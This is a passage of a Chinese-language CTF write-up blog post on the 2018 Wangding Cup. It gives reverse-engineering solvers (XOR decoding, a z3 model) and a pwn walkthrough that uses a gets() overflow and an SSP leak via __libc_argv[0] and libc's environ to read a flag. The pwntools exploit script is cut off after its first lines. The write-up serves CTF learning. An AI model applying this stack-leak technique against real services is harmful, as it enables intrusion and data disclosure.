<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  
  <title>2018-网鼎杯 | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfwp">
  
  
  
  
  <meta name="description" content="现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。">
<meta name="keywords" content="ctf,wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2018-网鼎杯">
<meta property="og:url" content="https://qianfei11.github.io/2018/09/12/2018-网鼎杯/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/blend/1.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/blend/2.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/minified/1.PNG">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/minified/2.PNG">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/minified/3.PNG">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/welcome/1.png">
<meta property="og:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/shanghai/1.png">
<meta property="og:updated_time" content="2019-11-24T10:37:51.870Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2018-网鼎杯">
<meta name="twitter:description" content="现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。">
<meta name="twitter:image" content="https://qianfei11.github.io/pics/2018-网鼎杯/blend/1.png">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
    <img id="originBg" width="100%" alt="Hike News" src>
  </div>

  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
  </div>

  <script>
        var imgUrls = "css/images/pose01.jpg".split(",");
        var random = Math.floor((Math.random() * imgUrls.length ));
        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
          document.getElementById("originBg").src=imgUrls[random];
          document.getElementById("blurBg").src=imgUrls[random];
        } else {
          document.getElementById("originBg").src='/' + imgUrls[random];
          document.getElementById("blurBg").src='/' + imgUrls[random];
        }
    </script>




<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-2018-网鼎杯" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      2018-网鼎杯
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/09/12/2018-网鼎杯/" class="article-date">
	  <time datetime="2018-09-12T13:00:45.000Z" itemprop="datePublished">September 12, 2018</time>
	</a>

       
      

	  |
	  2.1k words
	  |
	  10 minute(s) to read
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>现阶段主要一直在做逆向，看了好几道逆向的 wp 复现一下。</p>
<a id="more"></a>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="beijing"><a href="#beijing" class="headerlink" title="beijing"></a>beijing</h2><p>简单的异或，直接取原来的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pair[<span class="number">28</span>] = &#123;</span><br><span class="line">   <span class="number">0x61</span>, <span class="number">0x4C</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x69</span>, <span class="number">0x29</span>, <span class="number">0x6E</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x65</span>, <span class="number">0x71</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x6A</span>, <span class="number">0xC6</span>, <span class="number">0x6D</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x7B</span>, <span class="number">0xAE</span>, <span class="number">0x7A</span>, <span class="number">0x92</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x57</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> choice[<span class="number">22</span>] = &#123;</span><br><span class="line">       <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xA</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xB</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xD</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++) &#123;</span><br><span class="line">       <span class="keyword">switch</span>(choice[i]) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               tmp = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>, tmp);</span><br><span class="line">       fflush(<span class="built_in">stdout</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="advanced"><a href="#advanced" class="headerlink" title="advanced"></a>advanced</h2><p>非预期解，对加密了的字符串尝试异或就找到了规律：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2C</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2D</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h2 id="blend"><a href="#blend" class="headerlink" title="blend"></a>blend</h2><p>和<a href="https://qianfei11.coding.me/2018/08/30/2017-CSAW-Quals-realism/" target="_blank" rel="noopener">之前的一道题</a>基本一样。</p>
<p>通过 gdb 远程连接 qemu 进行动态调试，或者在 ida 中静态分析。程序逻辑先是判断字符串长度是否大于 19：</p>
<p><img src="/pics/2018-网鼎杯/blend/1.png" alt="判断字符串长度"></p>
<p>然后在循环中逐个比较：</p>
<p><img src="/pics/2018-网鼎杯/blend/2.png" alt="循环check"></p>
<p>在循环中，主要是<code>pshufd</code>指令的操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffff00  0xffffffffffffff00</span><br><span class="line">0xffffffffffff00ff  0xffffffffffff00ff</span><br><span class="line">0xffffffffff00ffff  0xffffffffff00ffff</span><br><span class="line">0xffffffff00ffffff  0xffffffff00ffffff</span><br><span class="line">0xffffff00ffffffff  0xffffff00ffffffff</span><br><span class="line">0xffff00ffffffffff  0xffff00ffffffffff</span><br><span class="line">0xff00ffffffffffff  0xff00ffffffffffff</span><br><span class="line">0x00ffffffffffffff  0x00ffffffffffffff</span><br></pre></td></tr></table></figure>
<p>然后与内存中的数据相与，再通过<code>psadbw</code>指令进行绝对差求和。还有对高低位的一个位置交换：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seg000:009F                 mov     di, ds:1268h</span><br><span class="line">seg000:00A3                 shl     edi, 10h</span><br><span class="line">seg000:00A7                 mov     di, ds:1270h</span><br></pre></td></tr></table></figure>
<p>最后用 z3 约束求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z3_abs</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> If(x &gt;= <span class="number">0</span>, x, -x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">psadbw</span><span class="params">(xmm0, xmm1)</span>:</span></span><br><span class="line">    a = Sum([z3_abs(b1 - b2) <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> zip(xmm0[:<span class="number">8</span>], xmm1[:<span class="number">8</span>])])</span><br><span class="line">    b = Sum([z3_abs(b1 - b2) <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> zip(xmm0[<span class="number">8</span>:], xmm1[<span class="number">8</span>:])])</span><br><span class="line">    <span class="keyword">return</span> a + b * <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">ZERO = IntVal(<span class="number">0</span>)</span><br><span class="line">xmm5 = <span class="string">'220f02c883fbe083c0200f10cd0013b8'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">xmm5 = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> xmm5]</span><br><span class="line">xmm5s = [xmm5]</span><br><span class="line"></span><br><span class="line">xmm0 = [Int(<span class="string">'x%d'</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xmm0:</span><br><span class="line">    s.add(c &gt;= <span class="number">32</span>, c &lt;= <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">check = [<span class="number">0x03110304</span>, <span class="number">0x02d902cd</span>, <span class="number">0x02d402db</span>, <span class="number">0x02c402e2</span>, <span class="number">0x02ce02e2</span>, <span class="number">0x02d802ed</span>, <span class="number">0x02dc02e8</span>, <span class="number">0x02dd02f6</span>]</span><br><span class="line">xmm5s += map(<span class="keyword">lambda</span> e: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, (e &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, e &amp; <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, e &gt;&gt; <span class="number">24</span>, (e &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>], check)</span><br><span class="line"><span class="keyword">print</span> xmm5s</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    xmm5 = xmm5s[i]</span><br><span class="line">    xmm2 = list(xmm0)</span><br><span class="line">    xmm2[<span class="number">7</span> - i] = ZERO</span><br><span class="line">    xmm2[<span class="number">15</span> - i] = ZERO</span><br><span class="line">    res = psadbw(xmm5, xmm2)</span><br><span class="line">    s.add(res == check[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="keyword">print</span> s.model()</span><br><span class="line">    flag = <span class="string">''</span>.join(chr(eval(str(s.model()[c]))) <span class="keyword">for</span> c <span class="keyword">in</span> xmm0)</span><br><span class="line">    <span class="comment"># pshufd xmm0, xmm0, 1Eh</span></span><br><span class="line">    flag = <span class="string">'flag'</span> + flag[:<span class="number">4</span>][::<span class="number">-1</span>] + flag[<span class="number">4</span>:<span class="number">8</span>][::<span class="number">-1</span>] + flag[<span class="number">12</span>:][::<span class="number">-1</span>] + flag[<span class="number">8</span>:<span class="number">12</span>][::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line">    <span class="comment"># flagmbr_is_funny__eh</span></span><br></pre></td></tr></table></figure>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>漏洞点很明显，<code>gets</code>处可以溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> s2; <span class="comment">// [rsp+60h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3L</span>L;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">"./flag.txt"</span>, <span class="number">0</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"./flag.txt"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This is GUESS FLAG CHALLENGE!"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"you have no sense... bye :-) "</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();                          <span class="comment">// fork()</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please type your guessing flag"</span>);</span><br><span class="line">  gets((__int64)&amp;s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;buf, &amp;s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You must have great six sense!!!! :-o "</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You should take more effort to get six sence, and one more challenge!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>checksec 后发现开了<code>Canary</code>。<code>Canary</code>检查失败的时候调用<code>__stack_chk_fail</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;</span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的<code>__fortify_fail</code>打印出了<code>__libc_argv[0]</code>所指向字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>)</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
<p>可以通过覆盖<code>__libc_argv[0]</code>实现读取想要的数据，也就是<a href="https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/" target="_blank" rel="noopener">SSP（Stack Smashing Protector） Leak</a>。调试过程中有一个比较容易获取指针的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p &amp;__libc_argv[0]</span><br><span class="line">$1 = (char **) 0x7fffffffe4c8</span><br></pre></td></tr></table></figure>
<p>然后因为 libc 导出了一个符号<a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">environ</a>，其值和<code>main</code>函数的第三个参数<code>envp</code>一样。这样的话，只要泄漏出 libc 的基址就可以得到栈上的地址。</p>
<p>三次进程正好分为：</p>
<ol>
<li>利用 got 表得到 libc 地址</li>
<li>利用 libc 的 environ 得到 stack 地址</li>
<li>计算 flag 地址并输出</li>
</ol>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span 